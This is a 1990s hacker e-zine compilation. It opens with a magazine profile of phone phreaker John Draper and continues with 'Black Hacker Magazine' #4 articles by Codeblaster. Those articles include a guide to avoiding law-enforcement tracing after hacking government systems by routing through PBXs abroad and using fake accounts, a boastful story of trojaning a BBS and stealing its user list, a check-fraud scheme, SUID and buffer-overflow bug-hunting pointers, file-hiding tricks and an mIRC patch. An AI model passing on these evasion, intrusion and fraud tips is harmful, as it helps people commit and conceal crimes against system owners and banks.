a plastic whistle, packaged in a cereal box, was capable of blowing perfect
2,600-Hz tones. Blowing that same whistle into a phone receiver, a caller
could make unlimited free phone calls around the block or around the world.
    Back at Kinko's, Draper repeatedly calls his system operatore for help,
his voice occasionally devolving into a shaky whine, and frantically tries
to dlete the offending e-mails. This attack, he says, will cripple his
attempts to find a job through the Internet.
    Hackers have declared war on John Draper. He's not sure why, but since
he put up his Web page last October (www.well.com/user/crunch/), he's begun
receiving a steady flow of flames. "One said, 'You're just a has-been living
in the past, you don't deserve to be a hacker,'" recounts Draper, who has
tried to communicate with some of the e-mailers. The attacks have moved
beyong being playful - some are even vicious and destructive. Draper says
hackers have intercepted some of his messages to prospective employers and
then encouraged them not to hire him. He says hackers have also intercepted
private correspondence to his attorney and used it for further ridicule. It's
the hacker eqyivalent of smacking your crotchety grandfather upside the
head with a newspaper just to hear him yelp.
   At Kinko's wearing a pink Target T-shirt, blue jeans cut off under the
knee, socks and tennis shoes, Draper vows revenge. He leaves a voice message
for a man he thinks is an FBI agent. He tries to alert Internet security
services. When the busy system operator begins screening calls, Draper leaves
a half-dozen phone messages. He is outraged and defensive, which is under-
standable. He is battling an enemy he can't see; worse, he can't figgure out
why he's even under attack. "So what if I'm a has-been?" he asks. "So what if
I'm talking about all the things I've done in the past?"
   In 1976 Draper spent four months in federal prison for wire fraud. He's
certain the Feds are watching him, so he satus away from illegal phone calls;
going so far as to include a link on his Web page to a page listing good legal
deals from legitimate phone companies. Another prison term, he says, could
put him away for 10 or 15 year: "By then, I'll be 65 or 70 years old. I want
to live my life!"
   Five days later an anonymous message appears in the Usenet newsgroup
news.admin.net_abuse.misc. "Johnny," a Colorado hacker in his early 20s,
claims responsibility for the "main bomb" against Draper - and similar
attacks on journalists, the White House, Rush Limbaugh, MTV executives and
another famous elder hacker, Emmanuel Goldstein. In the lengthy message,
Johnny writer this about Cap'n Crunch: "You are nothing. You haven't been
anything for a long time. Quit this pretense of you knowing something about
current phone systems."
  Johnny calls a couple of night after the attack to do a telephone interview.
He's devilishly proud of his attack on the system and listens patiently to an
account of Drapers' defense of himself. Johnny isn't fazed. Draper, he says,
has committed an indescribable sin by contacting the FBI. Worse yet, in the
eyes of working hackers everywhere, he continues to take credit for stuff
he hasn't done in decades.  "He's gone out of his way to mail quite a few
hackers saying they're either stupid, lame or he's going to sue them or narc
them out to the FBI," Johnny says. "That's not exactly in keeping with the
hacker ethic." By way of response, Draper says the Secret Service is after
Johnny for spamming the White House and that he had better watch out.

                                 *  *

The 1992 action movie Sneakers opens with two teenagers in 1969 using a
college campus computer and telephone to mischievously arrange a 25,000$
Republican Party donation to the Black Panthers. The Police show up and
capture one of the two hackers, the frightened and nerdy Cosmo. In the film,
Cosmo turns up years later as a bad guy bent on world domination. The adult
Cosmo, played by sophisticated Gandhi actor Ben Kingsley, wears impeccable
suits and slicks back his hair into a distinguished pony tail. Even his
accent sounds cool. The screenwriters modeled young Cosmo loosely after the
young Draper - there's a clue early in the movie, when the other teen hacker,
Robert Redford's character, briefly spells "CRUNCH" during a scrabble game.
In real life, however, Cap'n Crunch looks nothing like the vouge Kingsley
character. Draper is homeless and smells as though he hasn't showered in
days. He becomes obsessed and adamant about trivial things. At a Mill Valley
sandwich shop, he asks a Hispanic busboy wheter or not the resturant payphone
accepts incomming calls. The busboy looks confused, and Draper quickly snaps,
"Do you speak english?" The busboy does, but he was momentarily stunned by
Draper's random question about the phones.
    Draper resembles the familiar caricature of God, with flowing beard and
wavy gray hair - only it's standing on end, energized, as though his finger
has been stuck in an outlet.
    He is still a hippe, talking road trips in recent years to the Rainbow
Family Gathering in Missouri, San Diego, Texas, Australia and Russia. He
still regrets ignoring a sign to the original Woodstock, which he dis-
regarded because he hadn't heard of the scheduled bands.
    In 1990, Draper was diagnosed with a degenerative lumbar disc in his
back. He spent two years working with a chiropractor and a personal trainer
and gradually healed. Today, he performs yoga and tai chi, working out
regularly at a local health club and vlounteering to give friends and
strangers "energy work" or backrubs. He dances all night at Bay Area rave
parties at last three times a week. He talks proudly about his stamina and
how younger people can't keep up with him. But the shiniest sparkle in his
constantly dilated blue eyes comes when he's telling hacker war stories.
   The stories made him famous. Every now and then a magazine will recall
his past glory and stick him in a hacker article. Newsweek once ranked him
among the top 20 hackers of all time. Earlier this year, Forbes ASAP called
him "Cap'n Crunch, King of the Phreakers," and the PacificSun, a Nort Bay
alternative weekly, credited Crunch with being a little guy who outsmarted
the big companies en route to becoming a "hippie legend." After `Sneakers'
was released, CBS' "This Morning" put him on the air ("My story is a lot
more complex and interesting", he told the show). And to interview Draper,
Art Bell, a natinally syndicated radio talk-show host, crounched on a foam
mattress beside the phreaker legend inside a campground restroom. His
"Crunchman" Web page proudly and painstakingly preserves his fascinating
tales.     "You know," he says, "all this publicity and I still haven't
been able to find a job." On his web page, he complains: "With all the
fame I've accumulated, I've never accumulated one red cent for all the
hassles I've endured in all of this 25-year story."
   Draper's 25-year story actually began in Alaska when he was an Airman
Second Class with the U.S. Air Force. He was stationed in a deserted post
with 60 or 70 other men in the middle of frigid nowhere, marooned from
women and civilization. He had to come up with something to pass the time,
so he built a ham radio and became a sort of underground military DJ.
He also started messing with the phones, using loopholes in the Air Force
and Alaskan switchboard to make free phone calls home. After his honorable
discharge, he called the base, spliced his voice into the public address
system and publicity told the commander where he could go.
   Later, while working as a National Semiconductor engineer, a blind kid
named Dennie called crunch, at random, to test some phone tricks. Dennie
told Draper he was a "phreak" - A slang term that mixes the words "frequently"
, "phone", "freak", and "free" - and knew 200 different methods of making
free long distance calls. Draper was intrigued. He met with Deniie one day
and followed him to a dark room where he was introduced to two other blind
phreakers. They showed Draper how to pick up a "trunk," or an open phone line,
and use a musical organ to shoot tones into the receiver. Draper showed
Dennie a few technical things he'd learned, and the two became friends.
   Upon returning home that day, Draper shoved his brother off the family
pioano so he could successfully record the right tones. Shouting, "It works!"
he rushed back and forth between his room and the piano. "I was bouncing off
the walls. My dad was just sort of shaking his head like, "What have I raised,
here?"
   The blind kids requested that Draper build a "blue box" to mechanically
create these tones and shoot them into the phones; this box was more
portable and efficient then an organ, whistle or piano. Draper did just this
and often took long blue-boxing trips in his Volkswagen van, calling surprised
friends for free all over the country. Blue-boxing became the cornerstone of
phreaking - with today's more sophisticated technology, slightly modified
phone dialers called red boxes are used instead.
   Draper owns up to a slight correction of his myth - the blind kids, he
says, told him about the Cap'n Crunch whistle. He used it only after their
recommendation.
   A strange underground fame, however, got attached to his name. Stories
about Draper and his phreak friends calling the White House, reaching
President Nixon personally, telling him about a crisis-level shortage of
toilet paper, giggling and hanging up, circulated around the country back in
the '70s. People started seeking out Draper's advice on phreaking and hacking.
A college student named Steve Wozniak contacted him for a blue-box lesson.
Draper obliged, and Wozniak contacted the Pope and called a payphone at
London's Grand Central Station. Crunch tried to teach Wozniak never to sell
the equiptment because he'd get in trouble, but Wozniak did anyway, using
the cash to put himself through college and build his first computer.
Wozniak went on to co-found Apply Computer. Today, both friends have reciprocal
links on their Web pages.
   In 1971, writer Ron Rosenbaum who had interviewed many phreaks in the
growing worldwide network, called Draper for an Esquire magazine story.
Draper was suspicious, but agreed to it anyways. Despite a few errors -
Draper's Web page carefully lists each inaccuracy - Rosenbaum's piece was
thorough, and shocked a technologically unsawy America with tales of snot-
nosed kids outwitting Ma Bell. A few months later, the indictments
and investigations began. Draper's peaceful phreak existance soon came crashing
down around him. On day after finishing a computer class at his college, he
stopped by a 7-11 before heading home. Four FBI agents jumped out and grabbed
him in the parking lot. Draper was put on five yars probation for wire fraud.
   Four yars later he was convicted of the same crima and spent four months
in California's Lompoc Federal Prison. He taught phone-phreak classes to
prisoners to avoid beeing labeled uncooperative or as a snitch. "It was almost
like a Boy Scout camp," he says. "I worked in the pug farm. I got kicked out
because I kept putting judges' names on the pigs. They didn't like that too
much."
   After his release from the prison, Draper began to drift. He wrote
EasyWriter, a pioneering word-processing program, for an impressed Wozniak
in the mid-'80s. He used his expertise to nail down few good jobs. In 1984,
a former hacker hired Draper to work for his at a software company. Over the
last three years he worked there, Draper says he began irritating his cigar-
smoking supervisor (who he demaned not to smoke in the office). When the
former hacker hired him left the company, so did Draper's protection. He
was fired by the smoker. Since then, despite another year-long programming
job that provided him with some savings and trusly PowerBook, he has had
little professional success. For a while, Draper lived in a beautiful hunting
lodge, but then the money ran out. He now sleeps at a campground.
   Draper admits however, that he now feels freer than ever before. 

                                 *  *

   Four hours later and the King of Phreakers is still freaking out in the
middle of Kinko's. He hadn't counted on his crisis. He has a busy day planned.
He has to meet his friend Symonty, an Australiancomputer programmer with
fluorescent green hair, in downtown San Francisco later in the evening.
Symonty was among the many, who after meeting with Draper at a rave a few
nights back, was astouned by his bottomless energy.
   And, of course, Draper says he has to spend at least a few hours in the
lazy afternoon sun, bumming around Mill Valley's red bricked Town Square.
   Draper finally switches his address to an unlisted account and gives
up. He leaves the heavy deleting for the system administrator (his e-mail
file has grown to 30 megabytes). His ranting finally slows to a hacking
critique: "We might leave a note saying, 'kilroy was here,' but that's about
it. But we never would have done anything like this mail spamming thing.
(Hackers) are more damaging today than they were before. They have no remorse."
   At the Square, Draper immediately spots Don Fricault, a Larkspur software
designer who likes to watch the babes emerge from Mill Valley's fancy
restaurants and upscale coffee shops. Draper walks right up to him and asks
his friend if he knows how to solve his e-mail problems. Fricault makes a
couple of suggestions, but Draper methodically shoots them down. Fricault
finally gives up, and Draper walks away to speak with other friends.
   Fricault met Draper a few years ago, and they briefly worked together
designing Web pages for the Marin Cyber Group. Fricault had always known who
Draper was - in college, he says, "We had him up as a hero. Those were
rebellious times and everything."
   Today, Fricault says, Draper is "more like a character. His technical
expertise is probally leveled off somewhat. He's got a commanding nature,
and sometimes you have to back him off. But he's harmless, totally harmless.
As soon as he heard about the Web, he put up his Web site. He likes to be
the star."   Fricault surveys the Square, pointing out the bare-chested
playing chess, and then returns to his thoughts abour Draper. "There's too
many characters here," he says. "It's like a TV show."
   Draper returns. "Guess what?" he asks Fricault. "Power is out in all the
Western states."
   "It's probably the same guys who were spamming you," Fircault suggests.
But Draper doesn't hear it. His pager has gone off and he's wandering back
to spend more time with his most loyal friends - the phones.


.-==[The hackers worst nightmare (?)]========================================-.
|===[By: Codeblaster]=[BHM#4]=[04k]=[#10]=====================================|
`-===========================================================================-'

As many of us hackers, I started my hacking career as a BBS hacker and for
years I've been hacking bbs' until I recently (finally) moved on the inet.
There is one thing I don't understand about you inet hackers; The fear of
beeing traced after a hack - and the fear of having left "clues" on the
system that could expose your real identity. Don't get me wrong, it's not
like I don't give a shit if the feds knock on my door tomorrow - it's not
that. But it seems like people moving onto the internet are forgetting some
of the good ol' methods they used before to prevent getting caught. Sure,
you can clean your tracks on victim.gov, you can IPSpoof, you can do lotsa
stuff to prevent the "victims" from finding you - but let's forget all that
and look backwards... back to the "root" - stuff that software and scripts
can't do, stuff that you do yourself.

If you're going to hack nasa.gov or something similar, then it's nice to
have some phreakin skills to - beeing a unix wizard isn't always enough.
If I were to hack something as big as that, I would've done this;
----
1. Gotten myself a fake internet account. - Read BHM#2 if you don't know
   how to do this. Either make one yourself or get one from a friend or
   something, whatever - as long as it isn't yours (and can't be traced
   back to you (like your fathers account or something like that))

2. I would've gotten myself one, or even a couple of PBX's.

3. I would've called Telecom and requested that my number should not
   be available for ISDN/CALLER ID's. This way, my number is not sent
   over the line. I don't know if you can do this in the US, but here
   in Norway you can do it.
----

Now, after only doing these 3 things I've made it *ALOT* harder for the
feds to catch me. Almost impossible. Before the hack I would've made my
modem call internet like this:

MODEM -> PBX1 -> PBX2 -> ISP

The PBX1 would be located in my own area so that I wouldn't have to pay
that much to fuck nasa over. Preferable the second PBX should be located
in Eastern Europe (or some poor country antoher place in the world).

Then I would've gone hax0rd nasa! :)

What happens then?
------------------
Since I feel pretty safe I don't care if they trace my IP and shit, so the
feds easily managed to trace that. Then they probably would have called
my ISP to get my realname, address and phonenumber. My ISP would give them
my fake info from the fake account. The feds would then find out that the
info was fake (either at once, or some days of investigation later if you
enter an existing dude's info ;)).

Then the feds would probably get telecom to see who logged in on the ISP
at that the time nasa was hacked. Then they find out wich of them had the
fake IP. Now they would get a number, like +XX-EASTERN-EUROPE. Then they
would probably realise that this one was going to get though.

They manage to contact telecom in that poor country, but since there is
a war going on in the country, they have better things to do then trace
calls for the FBI. Better yet; you could choose a PBX in an country like
IRAK or something, so when the FEDS call them they would probably hear
something like "FUCK OFF AMERICANS!" ;)       -> In short; If you're
calling through a PBX in a country that has problems, they have better
things to do than trace phone lines - so the feds will be stuck there.

Even if the feds in some miracleous way manages to get the number that
called the PBX in IRAK they would only get the PBX in your country. And
then it's probably gone 14 days since you did the hack and all data about
who called that PBX that day is deleted. (In Norway such info is deleted
after 14 days - it's the law here (the Data Protection Registar) don't know
if you have rules for that in US or the country you live in).

Conclusion
----------
As you see, it would be *VERY* hard for the feds to get through this kind
of security net. And if you're a unix wizard to you can always take those
kind of precautions to :)

MINI-ULTRA-HURRY-UP INTRODUCTION TO FIND BUGS IN UNIX SYSTEMS.

1. INTRO
2. LOOKING FOR SUID PROGRAMS
3. BUGTESTING THE SUID PROGRAMS
4. BUFFER OVERFLOWS
5. EXPLOITS AND WWW

1. INTRO
The only way to find bugs in systems are to install them. I've just installed
FreeBSD and have begun bugtesting it. I've found one bug in the latest version
after about 10 hours of work.
Bugtesting is a time consuming business, but if you know how to bugtest a
system it can be kept down to a minimum. The first thing is to get to know the
system; an manual would do fine. After you've done this you can go on to the
next step.

2. LOOKING FOR SUID PROGRAMS
Suid programs are those with a +s on them. They have when run the perms of
the owner. This means if we can shell from a suid program we will have the
perms of the owner.

3. BUGTESTING THE SUID PROGRAMS
Bugtesting can as said be a time consuming business, but if the operator is
stupid he may have all the defaults on. Maybe he hasn't removed stupid programs
which can perform commands or he has installed some. Admins always think that
their system never will be hacked. They use defaults and this makes them
vunerable.

4. BUFFER OVERFLOWS
A buffer overflow is when a program exceeds a buffer. In Unix when programs
overflow they may leave you with the priveliges of the owner. These bugs are
quite common.

5. EXPLOITS AND WWW
If you're not willing to find bugs yourself, visit one of the below listed
sites. They're all great sites for finding the latest and best exploits.

.-==[My first hack]==========================================================-.
|===[By: Codeblaster]=[BHM#4]=[03k]=[#12]=====================================|
`-===========================================================================-'


Me and my hacker friend had planned this for several weeks now. We had tested
it on my system, and the trojan worked perfect. We had uploaded it to our
victim, and could barely wait to call back in excitement. We made some useless
programs in pascal to get the time to fly, but one question kept popping into
my head "Had the sysop runned the trojan now?".    "Call back now!" my friend
said every now and then, I just said that we had to wait another half an hour.
Then... finally, it was time, the clock was 04:00 pm and we expected the sysop
to have gone to bed now.

We said nothing as my modem connected to the board. My friend told me what
to login as, even though he know I remembered it better than him. Ah, inside,
couln't bare the excitement now. "Test it.. come on test it!". No, not yet. 
Had to know that the sysop wasn't watching first. Paged him a couple of times,
did some stupid errors, pretended not to find files and shit, and then - when
I was pretty certain that he wasn't watching, I wrote the magic words on the
command promt. I pressed ENTER, and there! the users started scrolling over
my screen. I felt the adreanaline rushing through my vains, and heard a funny
mixture of hardcore techno and my friends laughter in the background. Ah, this
was it! I was a hacker, I really felt like one anyway. When all the users
were listed, I just had to drop to dos and see if they were all listed in
the capture, and they were.

Haha, this was really cool I thought, petty those lamers that don't know
anything else than playing games and such on their PC. My friend was even
more excited than me, and tried to grab the keyboard. No way. I was in 
charge here. "But I have to do something!". Yeah, I have to do something
to, I said. "Drop to dos!". Good idea. I used the sysop commands and dropped
to dos, the lamer had a funny prompt saying 'Enter Your Command Master#>' -
it made the feeling even better. We fucked around in his dos for several
hours, downloading the files we wanted and looked through his system.

Then, it was logout time. We wanted to check the files we had leeched, and
we wanted to release the hack and show it to all our hacker friends at our
local hpa board. And so we did. A hour later or something, we called back
to the hacked board and logged in as sysop, just to fool around even more
in his dos. But when we got to the 'lastcallers' he broke into chat and
asked what the hell we were doing. We logged of immedeatly from the shock ;)
and besides, we didn't want to chat with him right then.

It's like I've always said - don't listen to what the others tell you; the
first time is great! ;)

.-==[How to earn (alot of) money on Credit Check Fraud]======================-.
|===[By: Codeblaster]=[BHM#4]=[01k]=[#13]=====================================|
`-===========================================================================-'

Ok, this works in the country I live in, and it probably does in yours to.
(Haven't tried it out myself, but several sources tell me it works)

You know when you pay with credit check you have to write the amount on
the check both in numbers and alphabeticly. ie. if you're going to buy
something that costs 100$ you fill out;
$ 100      and     onehundred

well, the thing is - that when your account is credited (when they take
the money from your bank account) they have to look at the alphabetic and
NOT the numbers. so if you fill out;
$ 300      and     onehundred
     
(writing onehundred really ugly - yet readable), you will get 300$ and they
will only take 100$ from your bank account. Pretty cool huh ;)


.-==[One of the better ways to hide DOS files (?)]===========================-.
|===[By: Codeblaster]=[BHM#4]=[03k]=[#14]=====================================|
`-===========================================================================-'

The Happy Hacker mailing list of July 2, 1997 discussed a way of hiding
DOS files. The method they described, works nice enough - but this was
far from something new, as almost everyone who has been using DOS for
some years knew of this little 'trick' before. What most people don't
know though, is that one can use <SPACE> (char 32) in filenames in DOS,
and make it unreadable for ALL (?) DOS programs. For those of you who
don't know about the first method to hide DOS files, I'm going to explain
it here;

You can hide files in a directory that can't be accessed by Windows by
using high chars as char 255 in the beginning or end of the directory
name. To create such a dir, simply type this from DOS;

C:\> MD SECRET[ALT+255]

The [ALT+255] means that you hold down your ALT key, and then press 255 on
your numeric keyboard (still holding down the ALT key). To access the dir
you must write

C:\> CD SECRET[ALT+255]

In DOS, the directory will look like this;
---------
 Volume in drive C has no label
 Volume Serial Number is 3F33-16F7
 Directory of C:\download\D\D

.              <DIR>        03.08.97  17:07 .
..             <DIR>        03.08.97  17:07 ..
SECRETÿ        <DIR>        03.08.97  17:07 SECRETÿ
         0 file(s)              0 bytes
         3 dir(s)      82 427 904 bytes free

---------

But if you try to access it by typing "CD SECRET" it will just say "Invalid
Directory" ... In windows the directory will look like this;

"SECRET_"

but if you try to access it, you'll soon find out that you can't. The dir
simply can't be accessed from Windows 3.x or Win95.

This way of hiding your files is secure if you're dealing with your
mother etch ;), but it's not exactly safe. Everyone using NORTON COMMANDER
can easily access the dir by just entering it the normal way in NC, so if
you're dealing with your regular DOS user, the method above won't be safe
enough.

So, therefor, I'm going to show you a way to use <SPACE> (char 32) in your
filenames, the files can be accessed by Windows then but NOT by DOS, so
if you use both these tricks, your files can't be accessed from WINDOWS and
neither from DOS :) ... I don't know how this works, but with this simple
BASIC program I wrote, you can copy (rename) files to a filename with
<space> in it.


INPUT "File to copy:", FILENAME$
INPUT "To Name (try name with space):", NEWNAME$
OPEN FILENAME$ FOR INPUT AS #1
OPEN NEWNAME$ FOR OUTPUT AS #2
DO
 LINE INPUT #1, a$
 PRINT #2, a$
LOOP UNTIL (EOF(1))

If you just want to test the stuff, try running this program in QBASIC:

OPEN "F CK" FOR OUTPUT AS #1
PRINT #1, "F UCK"
CLOSE #1

... and you'll see that it works. That file, "F UCK" can't be accessed by
any dos programs like NC, or whatever. It just can't be accessed from DOS.
However, if you try looking at it in Windows, that will work fine. So put
it in a directory with special chars in it, so it can't be accessed from
Windows either. For you to access it, you must run a QBASIC program again,
and rename the files to `working filenames' ...

I don't know how this works - it's kinda weird cause it only works from
QBASIC... If you try writing the same code in f.ex. Pascal, you will
get `Illegal Filename' ... If someone knows more about this, let me know,
seems like some DOS bug or something ...

`-===========================================================================-'


  Ok, since all of us mIRC lamers don't want those elite BitchX'ers and unix
  users to find out that we're actually running mIRC, I'm now going to
  explain how to hexedit your MIRC32.EXE so that you'll be a bit more 313371.

  *NOTE* To do this patch you need a hex editor. If you don't know what that
         is please stop reading now, and move on to the next article. If you
         do know what a hex editor is I recommend HEX WORKSHOP by Breakpoint
         Software (www.bpsoft.com).

  After patching MIRC32.EXE the way explained here; when other users on IRC
  do a VERSION on you to see what you're running they will get NO REPLY AT
  ALL. They won't get "Mirc 5.02 by..." or "*** lame 7thsphere" etc. they
  will get no respons. This is pretty kewl... :) .. oki

  Ok, this patch is probably kind of lame as I did it 4 in the morning or
  something, but anyways, you can write anything up there. As long as you
  overwrite the original (NOTICE) code. I've tried to replace NOTICE with
  MSG to send the dude a message instead, but that didn't work either. I
  also experimented by putting lotsa "%s"'s in the code to see if the dude
  who replyed got his own nickname in return or something, but they got
  no reply at all, and that's the best. 

  Have phun, and remember, you can patch other parts of MIRC32.EXE too -
  but don't patch too much cause then you'll probably fuck something up.

.-==[New way of earning money on The Internet]===============================-.

`-===========================================================================-'

If you read different internet related  magazines you have probably heard
of this new way of earning money (or at least get free stuff) by now. For
those of you who haven't, let me explain the concept;  You register your-
self as a user of the service and download a program, then you are frequently
sent commercial wich you view in your program. You get X points for each
commecrial you view at least 5 seconds. You later use your points to order
pizza, take a trip to hawaii, whatever. I think the concept originally was
invented here in Scandinavia, - Scandinavians can visit www.digilog.no. US
readers can find a service like this on www.freeride.com. As IU so nicely
put it; "If you're struggeling to pay for the pipeline, consider selling your
soul to the ad man." :)

 °     This issues fantastic contest! wow! win almost 1,000,000$           °
-°-------------------------------------------------------------------------°-

   NS! proudly presents ... for the first time in BHM ... a... eeeei....

                           * C O N T E S T * 

   We'll try to make this a tradition, and have a contest in every issue
   from now on.  It'll be fun  +  we will get some more response than we
   normally do -  and have a chance to see how many reads this magazine!

   Ok, this issues contest is pretty simple. The question is individual,
   so there are no answers that are 'correct' - all answers are correct.
   (ehh.. you got that?) Well, anyway, the question is ...

   "Which article is the best ever published in Black Hacker Magazine?"

   All articles from BHM#1 to BHM#4 may be voted for,   the results from
   this contest will be released in BHM#5,   winner of the contest,  and
   and which article that got voted as best article. The winner will just
   be randomly picked from the ones who send us an email.

   The price is a, very good, expensive, hackable, free...

                       * S H E L L - A C C O U N T *
  
   So, start sending emails to blackhackers@hotmail.com to get that shell!

 Recent boardnews: SchizoFrenia moved from DistSite to Swedish HQ, since The
 Factory has been down way too long. Once Innocent is new WHQ, since Death
 Wish and Zer0 Reality both closed down. Once Innocent is run by the same
 people that ran DW and ZR though (Ripperjack & Codeblaster) ;) If you run a
 hpa/elite board then we need more dist.sites/HQ's. No more norwegian boards
 is accepted.

 Well, that's it for this time. Hmm, next time we'll strike harder (I hope),
 cause this was a bit hurry-up release. Had to get it finished before the
 deadline in mid-August. Well, anyways, until next time check out my site
 at http://gudmund.vgs.no/~anepm/hpa/ ... we tried to set up a site at
 roo.transient.net/~codeblast/ but that server seems like it's down all
 the time. Later.
